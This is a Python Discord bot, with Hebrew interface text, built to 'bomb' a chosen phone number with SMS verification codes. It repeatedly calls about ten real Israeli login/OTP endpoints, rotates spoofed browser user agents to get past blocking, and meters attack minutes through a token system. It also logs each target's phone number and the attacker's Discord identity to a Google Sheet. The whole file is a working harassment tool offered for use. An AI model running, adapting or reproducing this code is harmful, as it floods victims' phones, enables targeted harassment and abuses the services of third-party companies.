import discord
from discord import app_commands
from discord.ext import commands
import os
import requests
import asyncio
import random
from datetime import datetime, timedelta

# --- הגדרות שרת (חובה להגדיר ב-Environment Variables) ---
TOKEN = os.getenv('DISCORD_TOKEN')
GSHEET_URL = os.getenv('GSHEET_URL') 

# חסימת מספר ספציפי (לפי בקשתך)
BLOCKED_NUMBER = "0535524017"

# ניהול נתונים זמני (בזיכרון)
user_tokens = {}  # יתרת דקות
user_cooldowns = {}  # זמן לטוקן יומי
active_attacks = {}  # מעקב אחרי הפצצות פעילות

# רשימת דפדפנים מזויפים לעקיפת חסימות
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        # מסנכרן את הפקודות (Slash Commands) עם השרת
        await self.tree.sync()
        print(f"✅ System Synced: {self.user.name}")

bot = CyberBot()

# --- מנוע ה-API (התחמושת) ---
def api_call(url, data=None, method="POST", is_json=True):
    try:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
            "Origin": "https://www.google.com",
            "Referer": "https://www.google.com/"
        }
        if method == "GET": r = requests.get(url, headers=headers, timeout=5)
        elif method == "PUT": r = requests.put(url, json=data, headers=headers, timeout=5)
        else:
            if is_json: r = requests.post(url, json=data, headers=headers, timeout=5)
            else: r = requests.post(url, data=data, headers=headers, timeout=5)
        return r.status_code in [200, 201]
    except:
        return False

async def fire_round(phone):
    tasks = [
        # סלקום (PUT)
        asyncio.to_thread(api_call, "https://digital-api.cellcom.co.il/api/otp/LoginStep1", {"Subscriber": phone, "IsExtended": False, "ProcessType": "", "OtpOrigin": "main OTP"}, method="PUT"),
        # MyOfer
        asyncio.to_thread(api_call, "https://server.myofer.co.il/api/sendAuthSms", {"phoneNumber": phone}),
        # אתרי אופנה (Form Data)
        asyncio.to_thread(api_call, "https://www.nine-west.co.il/customer/ajax/post/", {"type": "login", "telephone": phone}, is_json=False),
        asyncio.to_thread(api_call, "https://www.timberland.co.il/customer/ajax/post/", {"type": "login", "telephone": phone}, is_json=False),
        asyncio.to_thread(api_call, "https://www.gali.co.il/customer/ajax/post/", {"type": "login", "telephone": phone}, is_json=False),
        # אוכל
        asyncio.to_thread(api_call, "https://app.burgeranch.co.il/_a/aff_otp_auth", {"phone": phone}, is_json=False),
        asyncio.to_thread(api_call, "https://www.papajohns.co.il/_a/aff_otp_auth", {"phone": phone}, is_json=False),
        # חדשות וכללי
        asyncio.to_thread(api_call, "https://www.globes.co.il/news/login-2022/ajax_handler.ashx", {"value": phone, "value_type": "phone"}, is_json=False),
        asyncio.to_thread(api_call, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}),
        asyncio.to_thread(api_call, f"https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/{phone}", method="GET")
    ]
    results = await asyncio.gather(*tasks)
    return sum(1 for r in results if r is True), sum(1 for r in results if r is False)

# --- לוגיקת הפעלה ---
async def run_attack(interaction, phone, minutes):
    uid = interaction.user.id
    active_attacks[uid] = True
    total_s, total_f = 0, 0
    end_time = datetime.now() + timedelta(minutes=minutes)
    
    await interaction.followup.send(f"⚔️ **ההפצצה החלה!** יעד: `{phone}`", ephemeral=True)

    while datetime.now() < end_time and active_attacks.get(uid):
        if user_tokens.get(uid, 0) <= 0: break
        
        s, f = await fire_round(phone)
        total_s += s
        total_f += f
        
        await asyncio.sleep(60) # הפחתת טוקן כל דקה
        user_tokens[uid] -= 1

    # שליחת נתונים ל-Google Sheets שלך
    if GSHEET_URL:
        payload = {
            "user_name": interaction.user.name,
            "user_id": str(uid),
            "target_phone": phone,
            "rounds": f"{minutes} min",
            "success_count": total_s,
            "failed_count": total_f
        }
        try: requests.post(GSHEET_URL, json=payload, timeout=5)
        except: print("❌ GSheet Send Failed")

    active_attacks.pop(uid, None)
    await interaction.followup.send(f"🏁 **הסתיים!** יעד: `{phone}` | הצלחות: `{total_s}`", ephemeral=True)

# --- ממשק כפתורים ---
class CyberView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)

    @discord.ui.button(label="🚀 שגר הפצצה", style=discord.ButtonStyle.danger)
    async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
        if user_tokens.get(interaction.user.id, 0) < 1:
            return await interaction.response.send_message("❌ אין לך טוקנים! קח טוקן יומי.", ephemeral=True)
            
        class InputModal(discord.ui.Modal, title="CyberIL - Launcher"):
            phone = discord.ui.TextInput(label="מספר טלפון", min_length=10, max_length=10)
            mins = discord.ui.TextInput(label="זמן (1-100 דקות)", default="5")
            async def on_submit(self, modal_inter: discord.Interaction):
                if self.phone.value == BLOCKED_NUMBER:
                    return await modal_inter.response.send_message("🚫 המספר חסום!", ephemeral=True)
                await modal_inter.response.defer(ephemeral=True)
                asyncio.create_task(run_attack(modal_inter, self.phone.value, int(self.mins.value)))
        await interaction.response.send_modal(InputModal())

    @discord.ui.button(label="💰 בדיקת יתרה", style=discord.ButtonStyle.primary)
    async def check(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message(f"💳 יתרה: **{user_tokens.get(interaction.user.id, 0)} טוקנים** (דקות).", ephemeral=True)

    @discord.ui.button(label="🎁 טוקן יומי", style=discord.ButtonStyle.success)
    async def gift(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        if uid not in user_cooldowns or datetime.now() >= user_cooldowns[uid]:
            user_tokens[uid] = user_tokens.get(uid, 0) + 5
            user_cooldowns[uid] = datetime.now() + timedelta(hours=24)
            await interaction.response.send_message("✅ קיבלת 5 דקות חינם!", ephemeral=True)
        else:
            await interaction.response.send_message("⏳ כבר לקחת היום.", ephemeral=True)

    @discord.ui.button(label="🛑 עצור", style=discord.ButtonStyle.secondary)
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        active_attacks[interaction.user.id] = False
        await interaction.response.send_message("🚨 פעולה נעצרה.", ephemeral=True)

# --- פקודות Slash ---
@bot.tree.command(name="spamer-setup", description="הגדרת לוח הבקרה")
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(title="⚡ CyberIL Control Panel", color=0xFF0000)
    embed.add_field(name="מצב מערכת", value=f"יתרה: `{user_tokens.get(interaction.user.id, 0)}` דקות\nסטטוס: `Online`")
    await interaction.response.send_message(embed=embed, view=CyberView())

@bot.tree.command(name="spamer-givetokens", description="הענקת טוקנים (למנהלים)")
async def give(interaction: discord.Interaction, user: discord.Member, amount: int):
    user_tokens[user.id] = user_tokens.get(user.id, 0) + amount
    await interaction.response.send_message(f"🎁 {user.mention} קיבל {amount} טוקנים.", ephemeral=True)

# --- הרצה ---
if __name__ == "__main__":
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("❌ Error: No Discord Token found!")
